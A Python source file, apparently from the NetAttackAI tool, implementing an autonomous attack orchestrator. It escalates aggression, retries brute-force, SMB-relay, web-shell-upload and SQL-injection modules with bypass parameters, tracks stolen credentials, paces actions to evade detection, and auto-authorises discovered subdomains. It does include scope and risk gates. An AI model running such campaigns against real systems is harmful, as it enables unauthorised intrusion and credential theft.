"""Autonomous Attack Orchestrator — true autonomous offensive security engine.

Transforms the linear research agent into an aggressive, persistent attack engine:

1. Recon findings automatically trigger applicable attack modules
2. Failed actions retry with modified parameters
3. Adaptive aggression levels (stealth → normal → aggressive → maximum)
4. Attack queues and state persistence
5. Never stops after a single successful action
6. Automatic vulnerability chaining
7. Privilege escalation tracking
8. Attack timeline recording
9. Failure reasoning and mitigation

Usage::
    orchestrator = AutonomousOrchestrator(mission_config, workspace, tool_executor)
    await orchestrator.run_autonomous_campaign()
"""
# NetAttackAI by @braydos-h — https://github.com/braydos-h/NetAttackAi

from __future__ import annotations

import asyncio
import inspect
import json
import os
import re
import time
from contextlib import contextmanager
from contextvars import ContextVar
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Iterator

from tools.attack_modules import (
    AttackModule,
    ModuleContext,
    ModuleResult,
    _module_target_signature,
    find_modules,
    find_producers,
    get_module,
)
from tools.attack_ui import get_ui
from tools.logging_setup import get_logger
from tools.recon_pipeline import HostReconResult, ReconConfig, ReconPipeline
from tools.validation_utils import is_local_target

logger = get_logger()

# Process-wide UI singleton for operator-visible phase/action lines. The
# orchestrator's phase handlers previously emitted only ``logger.info`` lines
# (log file only), so an operator running the autonomous campaign saw no
# real-time phase transitions on the console. Routing phase transitions
# through ``ui.phase_change`` gives them the same [PHASE] banner the
# exploit-agent loop now emits.
ui = get_ui()

_AUTONOMOUS_PROGRESS: ContextVar[Callable[[dict[str, Any]], None] | None] = ContextVar(
    "autonomous_progress", default=None,
)


@contextmanager
def observe_autonomous_progress(
    callback: Callable[[dict[str, Any]], None],
) -> Iterator[None]:
    """Route this task's autonomous phase/action updates to ``callback``."""
    token = _AUTONOMOUS_PROGRESS.set(callback)
    try:
        yield
    finally:
        _AUTONOMOUS_PROGRESS.reset(token)


def _report_autonomous_progress(**payload: Any) -> None:
    callback = _AUTONOMOUS_PROGRESS.get()
    if callback is not None:
        try:
            callback(payload)
        except Exception:  # noqa: BLE001 -- observability must never stop a campaign
            pass

# ---------------------------------------------------------------------------
# Enums and data structures
# ---------------------------------------------------------------------------

class AggressionLevel(Enum):
    STEALTH = "stealth"
    NORMAL = "normal"
    AGGRESSIVE = "aggressive"
    MAXIMUM = "maximum"

class AttackPhase(Enum):
    RECONNAISSANCE = "recon"
    ENUMERATION = "enumeration"
    EXPLOITATION = "exploit"
    PRIVILEGE_ESCALATION = "privesc"
    LATERAL_MOVEMENT = "lateral"
    PERSISTENCE = "persistence"
    VALIDATION = "validation"
    REPORTING = "report"

class TaskStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    RETRYING = "retrying"
    BLOCKED = "blocked"
    CHAINED = "chained"  # Waiting for prerequisite

@dataclass
class AttackTask:
    task_id: str
    phase: AttackPhase
    module_name: str
    target: str
    parameters: dict[str, Any] = field(default_factory=dict)
    status: TaskStatus = TaskStatus.PENDING
    aggression: AggressionLevel = AggressionLevel.NORMAL
    priority: int = 50
    retry_count: int = 0
    max_retries: int = 3
    created_at: float = field(default_factory=time.monotonic)
    started_at: float | None = None
    completed_at: float | None = None
    result: dict[str, Any] = field(default_factory=dict)
    error: str = ""
    evidence_refs: list[str] = field(default_factory=list)
    chain_parent: str | None = None  # Task ID that must complete first
    chain_children: list[str] = field(default_factory=list)
    prerequisites: list[str] = field(default_factory=list)
    # Capability-upgrade: provenance tag. The dynamic-composition path sets
    # this to "recovery:prerequisite" when it schedules a producer module to
    # satisfy a missing artifact for a failed sibling. Empty for normal
    # planner-created tasks. Additive; serialized for resume/debugging only.
    created_from: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "task_id": self.task_id,
            "phase": self.phase.value,
            "module_name": self.module_name,
            "target": self.target,
            "parameters": self.parameters,
            "status": self.status.value,
            "aggression": self.aggression.value,
            "priority": self.priority,
            "retry_count": self.retry_count,
            "max_retries": self.max_retries,
            "created_at": self.created_at,
            "started_at": self.started_at,
            "completed_at": self.completed_at,
            "result": self.result,
            "error": self.error,
            "evidence_refs": self.evidence_refs,
            "chain_parent": self.chain_parent,
            "chain_children": self.chain_children,
            "prerequisites": self.prerequisites,
            "created_from": self.created_from,
        }

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> "AttackTask":
        """Reconstruct an AttackTask from its serialized form (Tier 1.3 resume).

        Tolerant of unknown enum strings: an unrecognized phase/aggression/
        status falls back to the defaults rather than raising, so a state file
        written by a newer/older version never breaks resume. ``created_at``
        and the started/completed timestamps are preserved verbatim so retry
        accounting and timeline ordering survive the round-trip.
        """
        def _enum(enum_cls, value, default):
            try:
                return enum_cls(value)
            except (ValueError, KeyError, TypeError):
                return default

        return cls(
            task_id=str(data.get("task_id", "")),
            phase=_enum(AttackPhase, data.get("phase"), AttackPhase.RECONNAISSANCE),
            module_name=str(data.get("module_name", "")),
            target=str(data.get("target", "")),
            parameters=dict(data.get("parameters", {}) or {}),
            status=_enum(TaskStatus, data.get("status"), TaskStatus.PENDING),
            aggression=_enum(AggressionLevel, data.get("aggression"), AggressionLevel.NORMAL),
            priority=int(data.get("priority", 50) or 50),
            retry_count=int(data.get("retry_count", 0) or 0),
            max_retries=int(data.get("max_retries", 3) or 3),
            created_at=float(data.get("created_at", 0) or 0),
            started_at=float(data["started_at"]) if data.get("started_at") is not None else None,
            completed_at=float(data["completed_at"]) if data.get("completed_at") is not None else None,
            result=dict(data.get("result", {}) or {}),
            error=str(data.get("error", "") or ""),
            evidence_refs=list(data.get("evidence_refs", []) or []),
            chain_parent=data.get("chain_parent"),
            chain_children=list(data.get("chain_children", []) or []),
            prerequisites=list(data.get("prerequisites", []) or []),
            created_from=str(data.get("created_from", "") or ""),
        )

@dataclass
class AttackState:
    """Persistent attack state for a target."""
    target: str
    current_phase: AttackPhase = AttackPhase.RECONNAISSANCE
    aggression: AggressionLevel = AggressionLevel.NORMAL
    privilege_level: str = "none"  # none, user, admin, system, root
    access_achieved: bool = False
    shell_type: str = ""  # none, reverse, bind, webshell
    successful_exploits: list[str] = field(default_factory=list)
    failed_attempts: dict[str, list[str]] = field(default_factory=dict)  # module -> [errors]
    attack_paths: list[list[str]] = field(default_factory=list)
    credentials_found: list[dict[str, str]] = field(default_factory=list)
    loot: list[str] = field(default_factory=list)
    pivot_targets: list[str] = field(default_factory=list)
    timeline: list[dict[str, Any]] = field(default_factory=list)
    recon_result: HostReconResult | None = None
    # Phase 2.2: persistence methods confirmed installed on the target
    # (e.g. ["cron", "schtask", "webshell"]). Populated only by the opt-in
    # _phase_persistence handler; empty when the persistence phase is off.
    persistence_established: list[str] = field(default_factory=list)
    # Domain targeting: the operator's original --target (domain or IP) and
    # the resolved IP for a domain target. When original_target is a domain,
    # the orchestrator runs subdomain expansion after recon to discover the
    # full attack surface and auto-authorizes each discovered host.
    original_target: str = ""
    resolved_ip: str = ""
    discovered_subdomains: list[dict[str, str]] = field(default_factory=list)
    # Phase 5: hard-target accounting. Counts adaptive rounds that produced no
    # novel candidate modules and no access; when it crosses
    # ``hard_target_max_rounds`` the campaign gives up on this target instead
    # of burning the remaining ``max_cycles`` budget. Reset per target.
    hard_target_rounds: int = 0

    def to_dict(self) -> dict[str, Any]:
        return {
            "target": self.target,
            "current_phase": self.current_phase.value,
            "aggression": self.aggression.value,
            "privilege_level": self.privilege_level,
            "access_achieved": self.access_achieved,
            "shell_type": self.shell_type,
            "successful_exploits": self.successful_exploits,
            "failed_attempts": self.failed_attempts,
            "attack_paths": self.attack_paths,
            "credentials_found": self.credentials_found,
            "loot": self.loot,
            "pivot_targets": self.pivot_targets,
            "timeline": self.timeline,
            "recon_result": self.recon_result.to_dict() if self.recon_result else None,
            "persistence_established": self.persistence_established,
            # Domain targeting: persist so a resumed campaign still knows it
            # was a domain run and doesn't lose the discovered-subdomain set.
            "original_target": self.original_target,
            "resolved_ip": self.resolved_ip,
            "discovered_subdomains": list(self.discovered_subdomains),
            "hard_target_rounds": int(self.hard_target_rounds),
        }

    @classmethod
    def from_dict(cls, data: dict[str, Any]) -> "AttackState":
        """Reconstruct an AttackState from its serialized form (Tier 1.3 resume).

        This is what makes a resumed autonomous campaign CONTINUE rather than
        restart: the recovered ``current_phase``, ``successful_exploits``,
        ``failed_attempts``, ``credentials_found``, ``access_achieved`` and
        ``recon_result`` mean the orchestrator skips already-done recon and
        doesn't re-fire modules that already succeeded/failed. Unknown enum
        strings degrade to defaults (never raise). ``recon_result`` is rebuilt
        via ``HostReconResult.from_dict`` so the prior scan's open ports live
        on across the restart.
        """
        def _enum(enum_cls, value, default):
            try:
                return enum_cls(value)
            except (ValueError, KeyError, TypeError):
                return default

        recon_data = data.get("recon_result")
        recon = HostReconResult.from_dict(recon_data) if isinstance(recon_data, dict) else None

        return cls(
            target=str(data.get("target", "")),
            current_phase=_enum(AttackPhase, data.get("current_phase"), AttackPhase.RECONNAISSANCE),
            aggression=_enum(AggressionLevel, data.get("aggression"), AggressionLevel.NORMAL),
            privilege_level=str(data.get("privilege_level", "none") or "none"),
            access_achieved=bool(data.get("access_achieved", False)),
            shell_type=str(data.get("shell_type", "") or ""),
            successful_exploits=list(data.get("successful_exploits", []) or []),
            failed_attempts=dict(data.get("failed_attempts", {}) or {}),
            attack_paths=[list(p) for p in (data.get("attack_paths", []) or []) if isinstance(p, list)],
            credentials_found=[dict(c) for c in (data.get("credentials_found", []) or []) if isinstance(c, dict)],
            loot=list(data.get("loot", []) or []),
            pivot_targets=list(data.get("pivot_targets", []) or []),
            timeline=list(data.get("timeline", []) or []),
            recon_result=recon,
            persistence_established=list(data.get("persistence_established", []) or []),
            # Domain targeting: restore so a resumed domain campaign keeps its
            # original_target/resolved_ip and discovered subdomains.
            original_target=str(data.get("original_target", "") or ""),
            resolved_ip=str(data.get("resolved_ip", "") or ""),
            discovered_subdomains=[
                dict(s) for s in (data.get("discovered_subdomains", []) or []) if isinstance(s, dict)
            ],
            hard_target_rounds=int(data.get("hard_target_rounds", 0) or 0),
        )

    def add_timeline_event(self, event_type: str, description: str, metadata: dict[str, Any] | None = None) -> None:
        self.timeline.append({
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event_type": event_type,
            "description": description,
            "metadata": metadata or {},
        })

    def record_failure(self, module_name: str, error: str) -> None:
        if module_name not in self.failed_attempts:
            self.failed_attempts[module_name] = []
        self.failed_attempts[module_name].append(error)

    def record_success(self, module_name: str, result: dict[str, Any]) -> None:
        self.successful_exploits.append(module_name)
        if result.get("shell_type"):
            self.shell_type = result["shell_type"]
            self.access_achieved = True
            # Surface the foothold to the operator so a long autonomous campaign
            # shows the breakthrough on the console, not just in the log file.
            ui.compromise(
                action_num=len(self.successful_exploits),
                shell_type=result.get("shell_type", ""),
                privilege_level=result.get("privilege_level", ""),
            )
        if result.get("privilege_level"):
            self.privilege_level = result["privilege_level"]
        if result.get("credentials"):
            self.credentials_found.extend(result["credentials"])
            ui.cred_dump(action_num=len(self.successful_exploits))
        if result.get("loot"):
            self.loot.extend(result["loot"])
        if result.get("pivot_targets"):
            self.pivot_targets.extend(result["pivot_targets"])

    def escalate_aggression(self) -> None:
        """Escalate aggression level after failures."""
        levels = [AggressionLevel.STEALTH, AggressionLevel.NORMAL, AggressionLevel.AGGRESSIVE, AggressionLevel.MAXIMUM]
        idx = levels.index(self.aggression)
        if idx < len(levels) - 1:
            self.aggression = levels[idx + 1]
            logger.info(f"Aggression escalated to {self.aggression.value} for {self.target}")
            # Surface aggression escalation to the operator — it drives which
            # modules the next round runs, so the user should see the campaign
            # getting more aggressive in real time.
            ui.warning(f"Aggression escalated to {self.aggression.value} — retrying failed modules")

    def should_continue(self) -> bool:
        """Determine if attack should continue based on state."""
        # Continue if:
        # 1. No access achieved yet
        # 2. Access achieved but not at max privilege
        # 3. There are pivot targets
        # 4. There are unexploited services
        if not self.access_achieved:
            return True
        if self.privilege_level not in ("system", "root", "admin"):
            return True
        if self.pivot_targets:
            return True
        return False


# ---------------------------------------------------------------------------
# Retry engine with parameter modification
# ---------------------------------------------------------------------------

class RetryEngine:
    """Intelligent retry with parameter modification."""

    RETRY_STRATEGIES: dict[str, list[dict[str, Any]]] = {
        "SSHBruteForce": [
            {"timeout": 10, "threads": 4},
            {"timeout": 15, "threads": 8, "wordlist": "medium"},
            {"timeout": 20, "threads": 16, "wordlist": "large", "aggressive": True},
        ],
        "SMBRelay": [
            {"timeout": 30},
            {"timeout": 60, "null_session": True},
            {"timeout": 90, "relay": True, "signing_check": False},
        ],
        "WebShellUpload": [
            {"extensions": [".php",".phtml",".php5"]},
            {"extensions": [".jsp",".jspx",".war"], "bypass": "double_extension"},
            {"extensions": [".aspx",".ashx",".asmx"], "bypass": "null_byte", "encoding": "utf-16"},
        ],
        "SQLInjection": [
            {"technique": "union", "level": 1},
            {"technique": "error", "level": 2},
            {"technique": "time", "level": 3, "tamper": "space2comment"},
            {"technique": "stacked", "level": 5, "tamper": "charencode"},
        ],
        "default": [
            {"timeout": 30},
            {"timeout": 60, "retries": 2},
            {"timeout": 120, "retries": 3, "aggressive": True},
        ],
    }

    @classmethod
    def get_retry_parameters(cls, module_name: str, attempt: int) -> dict[str, Any]:
        """Get modified parameters for retry attempt."""
        strategies = cls.RETRY_STRATEGIES.get(module_name, cls.RETRY_STRATEGIES["default"])
        if attempt < len(strategies):
            return strategies[attempt]
        # If we've exhausted strategies, return the last one with extra aggression
        params = dict(strategies[-1])
        params["aggressive"] = True
        params["timeout"] = params.get("timeout", 60) * 4
        return params

    @classmethod
    def should_retry(cls, module_name: str, error: str, attempt: int, max_attempts: int) -> bool:
        """Determine if a failed attempt should be retried."""
        if attempt >= max_attempts:
            return False

        # First, classify via the shared failure taxonomy. Permanent
        # classes (scope_blocked / false_positive) are never retried -- the
        # substring blacklist below stays as the conservative fallback for
        # anything the classifier misses or when the taxonomy import fails.
        try:
            from tools.failure_taxonomy import classify_failure, is_permanent
            fc = classify_failure(error)
            if is_permanent(fc):
                return False
        except Exception:  # noqa: BLE001 -- taxonomy import must never break retries
            pass

        # Don't retry on permanent failures
        permanent_errors = [
            "out of scope",
            "permission denied",
            "not authorized",
            "blocked by scope",
            "target unreachable",
            "connection refused",
        ]
        error_lower = error.lower()
        if any(pe in error_lower for pe in permanent_errors):
            return False

        # Don't retry if tool is not available
        if "not found" in error_lower or "not installed" in error_lower:
            return False

        return True


# ---------------------------------------------------------------------------
# Attack module executor
# ---------------------------------------------------------------------------

class AttackModuleExecutor:
    """Executes attack modules with scope checking, evidence capture, and retry logic."""

    def __init__(
        self,
        scope_gate: Any | None = None,
        risk_controller: Any | None = None,
        evidence_store: Any | None = None,
        *,
        blackboard: dict[str, Any] | None = None,
        mission_config: dict[str, Any] | None = None,
        model_client: Any = None,
        critic_agent: Any = None,
        reflection_agent: Any = None,
        tool_executor: Callable[[str, dict[str, Any]], str] | None = None,
        opsec_manager: Any | None = None,
        semantic_memory: Any | None = None,
        experience_store: Any | None = None,
    ) -> None:
        self._scope_gate = scope_gate
        self._risk_controller = risk_controller
        self._evidence_store = evidence_store
        # Phase 1: Bayesian ExperienceStore for the orchestrator's module-run
        # learning loop. Distinct from ``_evidence_store`` (the per-attempt
        # evidence capture). When wired (AutonomousOrchestrator passes its
        # self._experience_store through), execute() records each module run
        # outcome so find_modules on the next campaign reflects orchestrator
        # history. None (legacy callers, most tests) -> best-effort skip.
        self._experience_store = experience_store
        # Phase 6.2: optional OpsecManager. When wired (AutonomousOrchestrator
        # builds one from the ``opsec`` config block), execute() awaits
        # ``acquire_pacing(task.aggression.value)`` before each module run so
        # AggressionLevel.STEALTH becomes load-bearing (max jitter + min-gap +
        # rate bucket). Unwired / disabled profile -> pacing_delay is 0.0 and
        # acquire_pacing is a no-op, so legacy callers and tests are unchanged.
        self._opsec = opsec_manager
        # D1: optional SemanticMemoryManager. When wired (AutonomousOrchestrator
        # builds one from the ``orchestrator.semantic_memory`` config flag),
        # execute() calls store_lesson on a confirmed win so the campaign
        # learns across missions. No-op when None (the default opt-in state).
        self._semantic_memory = semantic_memory
        # Phase 2.1: the optional tool_executor lets execute() actually DISPATCH
        # a module's suggested_command / generated script and capture the real
        # output, instead of treating the module's dict as dead data. When wired
        # (AutonomousOrchestrator passes its own _tool_executor through), a
        # script/suggested_command is run, the output is classified via
        # ``classify_exploit_result``, and ``shell_type`` / ``privilege_level``
        # are only set when a real compromise marker (meterpreter / uid=0 / NT
        # AUTHORITY\SYSTEM) appears -- so ``access_achieved`` and the downstream
        # privesc/lateral phases only fire on a verified foothold. Unwired
        # (legacy callers, most tests) -> behaves exactly as before: module
        # dicts pass through unchanged.
        self._tool_executor: Callable[[str, dict[str, Any]], str] | None = tool_executor
        # Swarm integration (Tier 0 item 0.6b): the autonomous attack path
        # previously ran modules with only inline scope/risk checks and NO
        # multi-layer critic, NO reflection, and NO shared blackboard -- so the
        # most aggressive path bypassed all the swarm's multi-layer reasoning.
        # When wired (agent_loop passes the swarm's LIVE blackboard + fresh
        # CriticAgent/ReflectionAgent), execute() runs a critic pre-check (deny
        # blocks, modify mutates), records module outcomes to the shared
        # blackboard (so the critic's repeat-failure detection fires), and runs
        # a reflection post-check that publishes patterns/strategy-shifts.
        # Unwired (legacy callers, most tests) -> behaves exactly as before:
        # every helper below is a no-op when its agent/blackboard is absent.
        self._blackboard: dict[str, Any] = blackboard if blackboard is not None else {}
        self._mission_config: dict[str, Any] = mission_config or {}
        self._model_client = model_client
        self._critic = critic_agent
        self._reflection = reflection_agent
        self._action_count = 0

    async def execute(
        self,
        task: AttackTask,
        state: AttackState,
    ) -> dict[str, Any]:
        """Execute an attack module with full lifecycle management."""
        task.status = TaskStatus.RUNNING
        task.started_at = time.monotonic()
        self._action_count += 1
        action_num = self._action_count

        logger.info(f"Executing {task.module_name} against {task.target} (attempt {task.retry_count + 1})")
        # Surface each module dispatch to the operator so a long campaign shows
        # which attack module is running against which target in which phase.
        ui.action_status(
            action_num=action_num,
            tool=task.module_name,
            target=task.target,
            phase=task.phase.value,
        )
        _report_autonomous_progress(
            action=action_num,
            attempt=task.retry_count + 1,
            phase=task.phase.value,
            target=task.target,
            tool=task.module_name,
        )
        state.add_timeline_event(
            "module_execution",
            f"Executing {task.module_name} against {task.target}",
            {"attempt": task.retry_count + 1, "aggression": task.aggression.value},
        )

        # Scope check
        if self._scope_gate:
            scope_result = self._scope_gate.check_scope(
                asset=task.target,
                action_type=task.phase.value,
                tool_name=task.module_name,
                risk_level="high" if task.aggression == AggressionLevel.MAXIMUM else "medium",
            )
            if not scope_result.allowed:
                task.status = TaskStatus.BLOCKED
                task.error = f"Scope blocked: {scope_result.reason}"
                state.add_timeline_event("blocked", task.error)
                return {"success": False, "error": task.error, "blocked": True}

        # Risk check
        if self._risk_controller:
            if not self._risk_controller.can_proceed():
                task.status = TaskStatus.BLOCKED
                task.error = "Risk budget exhausted"
                return {"success": False, "error": task.error, "blocked": True}

        # Critic pre-check (Tier 0 item 0.6b): defense-in-depth on top of the
        # inline scope/risk checks above. When a CriticAgent is wired, it adds
        # forbidden-action, risk-profile, repeat-failure, and (optionally) LLM
        # reasoning. A "deny" blocks the run before any module code runs; a
        # "modify" mutates the task (aggression/risk downgrade, require_mutation
        # flag) and the run proceeds with the mutated task. Returns None when no
        # critic is wired (legacy path: only the inline checks above apply).
        critic_decision = await asyncio.to_thread(self._run_critic, task)
        if critic_decision is not None:
            decision = critic_decision.get("decision", "approve")
            if decision == "deny":
                task.status = TaskStatus.BLOCKED
                task.error = f"Critic denied: {critic_decision.get('reasoning', '')}"
                state.add_timeline_event("critic_deny", task.error)
                self._record_failure_on_blackboard(task.module_name)
                return {
                    "success": False, "error": task.error, "blocked": True,
                    "critic": critic_decision,
                }
            if decision == "modify":
                self._apply_critic_modifications(task, critic_decision.get("modifications", {}))
                state.add_timeline_event(
                    "critic_modify",
                    f"Critic modified {task.module_name}: {critic_decision.get('reasoning', '')}",
                )

        # Get module
        module = get_module(task.module_name)
        if not module:
            task.status = TaskStatus.FAILED
            task.error = f"Module {task.module_name} not found"
            state.record_failure(task.module_name, task.error)
            self._record_failure_on_blackboard(task.module_name)
            return {"success": False, "error": task.error}

        # Build context -- carry version + CPE so the module's
        # generate_dynamic_script records the correct service:version:os
        # signature for the ExperienceStore (audit: version was dropped here
        # too, so historical confidence never applied).
        # Phase 1/2: also thread the recovered credentials, the task's
        # parameters (e.g. {"exploit": ...} for ValidateFinding, callback_host
        # for persistence), and the mission config so post-exploit modules
        # (LateralMovement, ValidateFinding, persistence) can read them.
        ctx = ModuleContext(
            target_ip=task.target,
            target_os=state.recon_result.os_family if state.recon_result else None,
            services=[
                {
                    "service": s.service,
                    "port": f"{s.port}/{s.protocol}",
                    "version": s.version,
                    "cpe": list(s.cpe),
                    "banner": s.banner,
                }
                for s in (state.recon_result.services if state.recon_result else [])
            ],
            credentials=list(state.credentials_found),
            parameters=dict(task.parameters),
            config=self._mission_config,
            # Capability-upgrade (§12): thread live attack state so modules
            # can reason about prerequisites (foothold/privilege/sessions)
            # and prior evidence without raw logs. Additive; the defaults in
            # ModuleContext keep every other construction site byte-identical.
            access_achieved=state.access_achieved,
            privilege_level=state.privilege_level,
            sessions=(
                [{"shell": state.shell_type}] if state.access_achieved and state.shell_type else []
            ),
            phase=state.current_phase.value,
            evidence_refs=list(state.loot)[-10:],
        )

        # Phase 6.2: OPSEC pacing. Await the profile's pacing delay (jittered,
        # aggression-scaled) + optional rate bucket before the module runs. A
        # disabled profile or unwired manager makes this a no-op. Wrapped so an
        # OPSEC hiccup can never block an authorized attack step.
        #
        # Phase 6.2+ (target-aware OPSEC): resolve the effective manager against
        # THIS task's target so the operator-intent toggle bites per action --
        # local/private target -> disabled profile -> pacing no-op (the operator
        # owns the box, let the AI move freely); public target -> configured
        # posture (pacing/UA-rotation/quiet-commands ON). Resolving per-task
        # (rather than once at campaign start) keeps pivot targets correct:
        # ``OpsecManager.resolve_for_target`` returns ``self`` for a public
        # target (zero overhead) and a disabled manager for a local one. The
        # ``getattr`` guard keeps legacy/test fakes without the method working.
        if self._opsec is not None:
            try:
                mgr = self._opsec
                resolver = getattr(self._opsec, "resolve_for_target", None)
                if resolver is not None and task.target:
                    mgr = resolver(task.target)
                await mgr.acquire_pacing(task.aggression.value)
            except Exception as exc:  # noqa: BLE001 -- pacing is best-effort
                logger.debug(f"OPSEC pacing skipped for {task.module_name}: {exc}")

        # Execute with timeout
        try:
            timeout = task.parameters.get("timeout", 300)
            module_run = asyncio.to_thread(module.run, ctx)
            try:
                result = await asyncio.wait_for(module_run, timeout=timeout)
            except asyncio.TimeoutError:
                if inspect.iscoroutine(module_run):
                    module_run.close()
                raise

            # Phase 2.1: adapt the module's dict return into a typed
            # ModuleResult, then -- when a tool_executor is wired -- actually
            # DISPATCH any runnable artifact (suggested_command or generated
            # script) and classify the real output. Previously the module's
            # suggested_command / script keys were dead data on Path B (counted
            # as succeeded but never executed), so ``access_achieved`` was never
            # set and the downstream privesc / lateral phases never fired. Now a
            # real shell marker (meterpreter / uid=0 / NT AUTHORITY\SYSTEM) in
            # the dispatch output sets ``shell_type`` / ``privilege_level``, and
            # ``record_success`` flips ``access_achieved`` only on that verified
            # signal. Info-stub modules (status=info with no runnable script)
            # skip dispatch and stay info-stubs, so they never falsely set
            # access_achieved. Unwired (no tool_executor) -> the module's own
            # dict passes through unchanged, preserving legacy behavior.
            mresult = ModuleResult.to_result(result)
            dispatch_failure = False
            if self._tool_executor is not None and mresult.status not in ("info",):
                dispatch_out = await self._dispatch_module_artifact(module, mresult, ctx, task, state)
                if dispatch_out is not None:
                    output, classification = dispatch_out
                    # Merge real-output evidence onto the typed result.
                    if classification.get("evidence"):
                        mresult.evidence.extend(classification["evidence"])
                    outcome = str(classification.get("outcome", "unknown")).lower()
                    if outcome == "compromise":
                        # Verified shell -- set the keys record_success reads.
                        if classification.get("shell_type"):
                            mresult.shell_type = str(classification["shell_type"])
                        if classification.get("privilege_level"):
                            mresult.privilege_level = str(classification["privilege_level"])
                        state.add_timeline_event(
                            "compromise_verified",
                            f"{task.module_name} produced verified shell "
                            f"({mresult.shell_type or 'shell'}) against {task.target}",
                            {"outcome": outcome, "evidence": classification.get("evidence", [])},
                        )
                    elif outcome == "cred_dump":
                        # Credentials marker -- record as a credential string so
                        # record_success picks it up via result["credentials"].
                        mresult.credentials_found.append(
                            f"dump:{task.module_name}:{classification.get('evidence', ['creds'])[0]}"
                        )
                        state.add_timeline_event(
                            "cred_dump_verified",
                            f"{task.module_name} produced a credential dump against {task.target}",
                            {"evidence": classification.get("evidence", [])},
                        )
                    elif outcome == "failure":
                        # The dispatched artifact ran but explicitly failed -- do
                        # NOT count this as a succeeded module. The script may
                        # have been generated (status=script_generated) but the
                        # actual exploit failed, so mark it failed for retry.
                        dispatch_failure = True
                        if not mresult.note:
                            mresult.note = "Dispatched artifact reported failure markers"
                        state.add_timeline_event(
                            "dispatch_failure",
                            f"{task.module_name} dispatch output signalled failure",
                            {"evidence": classification.get("evidence", [])},
                        )
                    # 'partial' / 'unknown' -> ran but no verified compromise;
                    # leave shell_type empty so access_achieved stays False.

            # Convert the (possibly enriched) ModuleResult back to the dict shape
            # the renderer / record_success / task.result expect. Pass-through
            # extra keys are preserved by to_dict().
            result = mresult.to_dict()

            # Phase 1: feed this module run into the ExperienceStore so the
            # Bayesian learning loop reflects orchestrator history, not just
            # the exploit-agent loop. Best-effort -- a None store (legacy
            # callers) or a module with no target signature (no target_services)
            # is silently skipped. Maps info -> partial (neutral), real
            # compromise -> success, failure -> failure. This is the missing
            # wiring that makes find_modules on the next campaign prefer
            # proven modules and demote known-bad ones.
            if self._experience_store is not None:
                try:
                    sig = _module_target_signature(module, ctx)
                    if sig is not None:
                        self._experience_store.record_module_outcome(
                            target_signature=sig,
                            module_name=module.name,
                            status_str=str(result.get("status", "")),
                            metadata={"target": task.target, "phase": state.current_phase.value},
                        )
                except Exception:  # noqa: BLE001 -- learning loop is best-effort
                    logger.debug(f"ExperienceStore record skipped for {module.name}")

            # Process result
            task.result = result
            # A module that ran but did not achieve exploitation is NOT a success:
            # the retry/mutation loop (_execute_task_batch), lateral recursion
            # (_attack_target), and reflection (_run_reflection) all key off
            # result["success"] / task.status, so a ran-but-failed module must
            # report success=False and TaskStatus.FAILED -- otherwise failed
            # modules are counted as completed and never retried.
            # Phase 1: stop counting status="info" as _succeeded. Info-stub
            # modules produce no runnable artifact and no compromise signal --
            # counting them as success was a silent false-positive that left
            # ValidateFinding/LateralMovement "succeeding" without ever
            # dispatching (the dispatcher at line 659 correctly skips info
            # status, but _succeeded then counted them as wins). Now only
            # success/exploited/script_generated count as succeeded; info
            # modules are recorded as failures so the retry loop can re-queue
            # them with a dispatchable status (the module recipe must emit
            # script/suggested_command to actually win).
            _succeeded = (
                result.get("status") in ("success", "exploited", "script_generated")
                and not dispatch_failure
            )
            task.status = TaskStatus.COMPLETED if _succeeded else TaskStatus.FAILED
            task.completed_at = time.monotonic()

            if _succeeded:
                state.record_success(task.module_name, result)
                state.add_timeline_event(
                    "success",
                    f"{task.module_name} succeeded against {task.target}",
                    {"result_type": result.get("status")},
                )
                logger.info(f"Module {task.module_name} succeeded against {task.target}")
                self._record_success_on_blackboard(task.module_name)
                # D1: persist a cross-mission lesson on a confirmed win so the
                # campaign learns across missions, not just within the exploit
                # loop. Best-effort — store_lesson skips + logs when Ollama is
                # down, and a None manager makes this a no-op. Distinct
                # action_type keeps this from polluting the operational
                # exploit-action confidence rows in the ExperienceStore.
                await asyncio.to_thread(self._record_lesson_on_success, task, state, result)
            else:
                task.error = result.get("note", "Module did not achieve exploitation")
                state.record_failure(task.module_name, task.error)
                state.add_timeline_event("failure", f"{task.module_name} did not achieve exploitation")
                self._record_failure_on_blackboard(task.module_name)

            # Reflection post-check (Tier 0 item 0.6b): feed this attempt into the
            # ReflectionAgent. The agent updates the shared blackboard itself
            # (last_reflection / strategy_shift / failed_modules); it is
            # heuristic-only when no model_client is wired, so per-module cost is
            # low. Advisory -- exceptions are swallowed so reflection can't stall
            # the campaign. No-op when no reflection agent is wired.
            await asyncio.to_thread(
                self._run_reflection, task, state, {"success": _succeeded, "result": result},
            )

            return {"success": _succeeded, "result": result}

        except asyncio.TimeoutError:
            task.status = TaskStatus.FAILED
            task.error = f"Timeout after {timeout}s"
            state.record_failure(task.module_name, task.error)
            state.add_timeline_event("timeout", task.error)
            logger.warning(f"Module {task.module_name} timed out against {task.target}")
            self._record_failure_on_blackboard(task.module_name)
            return {"success": False, "error": task.error, "timeout": True}

        except Exception as exc:
            task.status = TaskStatus.FAILED
            task.error = str(exc)
            state.record_failure(task.module_name, task.error)
            state.add_timeline_event("error", f"Exception in {task.module_name}: {task.error}")
            logger.exception(f"Module {task.module_name} failed against {task.target}")
            self._record_failure_on_blackboard(task.module_name)
            return {"success": False, "error": task.error}

    # ── Phase 2.1 dispatch helper ───────────────────────────────────────────

    async def _dispatch_module_artifact(
        self,
        module: AttackModule,
        mresult: ModuleResult,
        ctx: ModuleContext,
        task: AttackTask,
        state: AttackState,
    ) -> tuple[str, dict[str, Any]] | None:
        """Dispatch a module's runnable artifact through ``self._tool_executor``.

        Resolves the artifact to a shell command in priority order:

        1. ``mresult.suggested_command`` -- a ready-to-run shell command
           (e.g. ``sqlmap -u ...``). Used as-is.
        2. ``mresult.script`` (or ``module.generate_python_script(ctx)``) -- a
           Python script string. Written to
           ``<workspace>/modules/<module>_<ip>.py`` and dispatched as
           ``python <path> <target_ip>``.

        Returns ``(output_text, classification_dict)`` on dispatch, or ``None``
        when there is nothing runnable (no command, no script) or the
        tool_executor raises (best-effort: the exception is recorded as a
        timeline event and we return ``None`` so the caller treats the module
